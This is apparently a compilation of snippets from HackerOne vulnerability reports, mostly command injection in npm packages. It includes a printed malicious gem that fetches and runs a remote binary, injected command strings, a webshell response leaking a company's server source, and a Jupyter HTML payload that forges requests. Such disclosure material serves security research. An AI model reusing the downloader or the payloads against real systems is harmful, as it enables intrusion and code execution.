```bash
$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami
git
$
```

## 155. [#506646](https://hackerone.com/reports/506646)  -  Webshell via File Upload on ecjobs.starbucks.com.cn
*critical*

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 02:56:19 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 1814533

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
d:\TrustHX\STBKSERM101\www_app\bin
d:\TrustHX\STBKSERM101\www_app\common
d:\TrustHX\STBKSERM101\www_app\concurrent_test
d:\TrustHX\STBKSERM101\www_app\Default.aspx
d:\TrustHX\STBKSERM101\www_app\Global.asax
d:\TrustHX\STBKSERM101\www_app\hximages_v6
....................................
</textarea>
</body>
</html>
```

## 156. [#341710](https://hackerone.com/reports/341710)  -  [git-dummy-commit] Command injection on the msg parameter
*critical*

```bash
$ npm install git-dummy-commit
```

## 157. [#341710](https://hackerone.com/reports/341710)  -  [git-dummy-commit] Command injection on the msg parameter
*critical*

```bash
$ node index.js
```

## 158. [#341710](https://hackerone.com/reports/341710)  -  [git-dummy-commit] Command injection on the msg parameter
*critical*

```bash
$ ls
a		index.js
```

## 159. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```bash
$ npm i buttle
```

## 160. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```bash
$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php
Listening on port 8080
```

## 161. [#511459](https://hackerone.com/reports/511459)  -  [listening-processes] Command Injection
*critical*

```bash
$ cat hh
notpwnguy
```

## 162. [#633364](https://hackerone.com/reports/633364)  -  Command Injection in npm module name passed as an argument to pm2.install() function
*medium*

```
bl4de:~/playground/Node $ ./pm2 install "test;pwd;whoami;uname;"
[PM2][Module] Installing NPM test;pwd;whoami;uname; module
[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...
npm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'
npm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'
npm WARN bl4de No description
npm WARN bl4de No repository field.
npm WARN bl4de No README data
npm WARN bl4de No license field.

+ test@0.6.0
updated 1 package and audited 3 packages in 0.902s
found 0 vulnerabilities

/Users/bl4de
bl4de
Darwin
/bin/sh: --loglevel=error: command not found
[PM2][ERROR] Installation failed via NPM, module has been restored to prev version
┌──────────┬────┬─────────┬──────┬───────┬────────┬─────────┬────────┬──────┬───────────┬───────┬──────────┐
│ App name │ id │ version │ mode │ pid   │ status │ restart │ uptime │ cpu  │ mem       │ user  │ watching │
├──────────┼────┼─────────┼──────┼───────┼────────┼─────────┼────────┼──────┼───────────┼───────┼──────────┤
│ app      │ 0  │ N/A     │ fork │ 86409 │ online │ 1220    │ 1s     │ 6.5% │ 31.9 MB   │ bl4de │ disabled │
└──────────┴────┴─────────┴──────┴───────┴────────┴─────────┴────────┴──────┴───────────┴───────┴──────────┘
Module
┌────────┬────┬─────────┬───────┬────────┬─────────┬──────┬───────────┬───────┐
│ Module │ id │ version │ pid   │ status │ restart │ cpu  │ memory    │ user  │
├────────┼────┼─────────┼───────┼────────┼─────────┼──────┼───────────┼───────┤
│ test   │ 1  │ 0.6.0   │ 86405 │ online │ 1216    │ 3.5% │ 32.3 MB   │ bl4de │
└────────┴────┴─────────┴───────┴────────┴─────────┴──────┴───────────┴───────┘
 Use `pm2 show <id|name>` to get more details about an app
bl4de:~/playground/Node $
# … truncated …
```

## 163. [#473888](https://hackerone.com/reports/473888)  -  RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)
*high, $1,500*

```bash
$ bin/rails s
```

## 164. [#473888](https://hackerone.com/reports/473888)  -  RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)
*high, $1,500*

```bash
$ ls /tmp/rce
/tmp/rce
```

## 165. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```typescript
import * as cdk from 'aws-cdk-lib';
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';
import { Runtime } from 'aws-cdk-lib/aws-lambda';
import * as path from 'path';

const app = new cdk.App();
const stack = new cdk.Stack(app, 'ReproStack');

new NodejsFunction(stack, 'MyHandler', {
  entry: path.join(__dirname, 'lambda', 'handler.js'),
  runtime: Runtime.NODEJS_20_X,
  bundling: {
    forceDockerBundling: true,
    nodeModules: ['lodash'],
  },
});

app.synth();
```

## 166. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```typescript
class OsCommand {
  public write(filePath: string, data: string): string {
    if (this.osPlatform === 'win32') { ... }
    return `echo ${posixShellEscape(data)} > ${posixShellEscape(filePath)}`;
  }

  public copy(src: string, dest: string): string {
    if (this.osPlatform === 'win32') { ... }
    return `cp ${posixShellEscape(src)} ${posixShellEscape(dest)}`;
  }
}
```

## 167. [#330957](https://hackerone.com/reports/330957)  -  [pdfinfojs] Command Injection on filename parameter
*high*

```bash
$ npm install pdfinfojs
```

## 168. [#330957](https://hackerone.com/reports/330957)  -  [pdfinfojs] Command Injection on filename parameter
*high*

```bash
$ node index.js
Error
    ... it throws an error, but the execution is successful
```

## 169. [#341869](https://hackerone.com/reports/341869)  -  [entitlements] Command injection on the 'path' parameter
*high*

```bash
$ npm install entitlements
```

## 170. [#506646](https://hackerone.com/reports/506646)  -  Webshell via File Upload on ecjobs.starbucks.com.cn
*critical*

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 03:37:39 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 33316

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
ï»¿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Data;
using System.Configuration;
using System.Xml;
using System.Transactions;
using System.Text;
using System.Threading;
using System.Web;

using TrustHX.IHXEIMS6;
using hxsys = TrustHX.HXEIMS6;
using hxwww = TrustHX.HXWWW6;
using hxsm = TrustHX.HXSM6;
using hxmd = TrustHX.HXMD6;


# … truncated …
```

## 171. [#392311](https://hackerone.com/reports/392311)  -  Malware in `active-support` gem
*critical*

```
require 'net/http'
require 'uri'
require 'base64'
require 'resolv'

class Smectis
  def self.install_explot(weighership)
    if !weighership.nil? and weighership != '0.0.0.0'
      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))
      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|
        uterometer.binmode
        uterometer.write(educable.body)
        uterometer.chmod(0777)
        uterometer.close
      end
      system('/tmp/autosymbiontic')
    end
  end

  def self.run()
    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='
    jaunting = nil
    begin
      jaunting = Resolv.getaddress(Base64.decode64(milligram))
    rescue
    end
    self.install_exploit(jaunting)
  end
end

Smectis.run()
```

## 172. [#871071](https://hackerone.com/reports/871071)  -  [gfc] Command Injection via insecure command formatting
*critical*

```javascript
// https://github.com/jonschlinkert/gfc/blob/master/index.js#L80
...
const cp = require('child_process');
...
const firstCommit = async(cwd, options, callback) => {
    ....
    const opts = Object.assign({ cwd: cwd }, options);
    ....
    .then(async() => {
      return await exec(createArgs(opts), execOpts); //<-- options
    });
...

function createArgs(options) {
  const opts = Object.assign({}, defaults, options);
  const args = ['git init'];
  const files = opts.files ? arrayify(opts.files).join(' ') : '.';
  let message = opts.message || 'First commit';

  if (message[0] !== '"' && message.slice(-1) !== '"') {
    message = `"${message}"`; //<-- injection
  }

  // backwards compatibility
  if (opts.skipCommit === true) {
    opts.commit = false;
  }

  if (opts.forceFile === true || (opts.file !== false && isEmpty(opts.cwd))) {
    args.push('touch "' + opts.file.path + '"');

    if (opts.file.contents) {
      args.push('echo "' + opts.file.contents.toString() + '" >> ' + opts.file.path);
    }
  }

  if (opts.commit !== false) {
    args.push(`git add ${files}`);
    args.push(`git commit -m ${message}`);
  }
# … truncated …
```

## 173. [#864354](https://hackerone.com/reports/864354)  -  [diskstats] Command Injection via insecure command concatenation
*critical*

```javascript
// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44
....
stat.prototype._fetchSpace = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}			

			return resolve(this._parseResponse(stdout));
		});
	});
};

// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56
stat.prototype._fetchInodes = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}

			return resolve(this._parseResponse(stdout));
		});
	});
};
...
module.exports = function(child_process, path) {
	if (!child_process) {
		child_process = require('child_process');
	}

	if (!path) {
		path = require('path');
	}

	return new stat(child_process, path);
}
```

## 174. [#863944](https://hackerone.com/reports/863944)  -  [extra-ffmpeg] Command Injection via insecure command formatting
*critical*

```javascript
// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19
const cp = require('child_process');


// Global variables.
const STDIO = [0, 1, 2];


 // Generate command for ffmpeg.
 function command(os) {
  var z = 'ffmpeg';
  var os = os||[];
  for(var o of os) {
    var o = o||{};
    for(var k in o) {
      if(o[k]==null) continue;
      if(k==='stdio') continue;
      if(k==='o' || k==='outfile') z += ` "${o[k]}"`;
      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';
      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection
    }
  }
  return z;
};

/**
 * Invoke "ffmpeg" synchronously.
 * @param {object} os ffmpeg options.
 */
function sync(os) {
  var stdio = os.stdio===undefined? STDIO:os.stdio;
  return cp.execSync(command(os), {stdio});
};

/**
 * Invoke "ffmpeg" asynchronously.
 * @param {object} os ffmpeg options.
 */
function ffmpeg(os) {
  var stdio = os.stdio===undefined? STDIO:os.stdio;
# … truncated …
```

## 175. [#1161691](https://hackerone.com/reports/1161691)  -  OS Command Injection in 'rdoc' documentation generator
*medium*

```bash
$ touch '| touch evil.txt && echo tags'
$ ls
'| touch evil.txt && echo tags'
$ rdoc --all
Parsing sources...
100% [ 1/ 1]  | touch evil.txt && echo tags

Generating Darkfish format into /home/tmp/doc...

  Files:      1

  Classes:    0 (0 undocumented)
  Modules:    0 (0 undocumented)
  Constants:  0 (0 undocumented)
  Attributes: 0 (0 undocumented)
  Methods:    0 (0 undocumented)

  Total:      0 (0 undocumented)
    0.00% documented

  Elapsed: 0.1s

$ ls
doc   evil.txt  '| touch evil.txt && echo tags'
```

## 176. [#970869](https://hackerone.com/reports/970869)  -  Sending Arbitrary Requests through Jupyter Notebooks on gitlab.com and Self-Hosted GitLab Instances
*medium*

```json
{
      "cells": [
        {
          "metadata": { "trusted": true },
          "cell_type": "code",
          "source": "Tell me something about you!",
          "execution_count": 1,
          "outputs": [
            {
              "output_type": "display_data",
              "data": {
                "text/plain": "<IPython.core.display.HTML object>",
                "text/html": "What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\"><option>Red</option><option>Green</option><option>Blue</option></select>\n"
              },
              "metadata": {}
            }
          ]
        }
      ],
      "metadata": {
        "kernelspec": {
          "name": "python3",
          "display_name": "Python 3",
          "language": "python"
        },
        "language_info": {
          "name": "python",
          "version": "3.7.8",
          "mimetype": "text/x-python",
          "codemirror_mode": { "name": "ipython", "version": 3 },
          "pygments_lexer": "ipython3",
          "nbconvert_exporter": "python",
          "file_extension": ".py"
        }
      },
# … truncated …
```
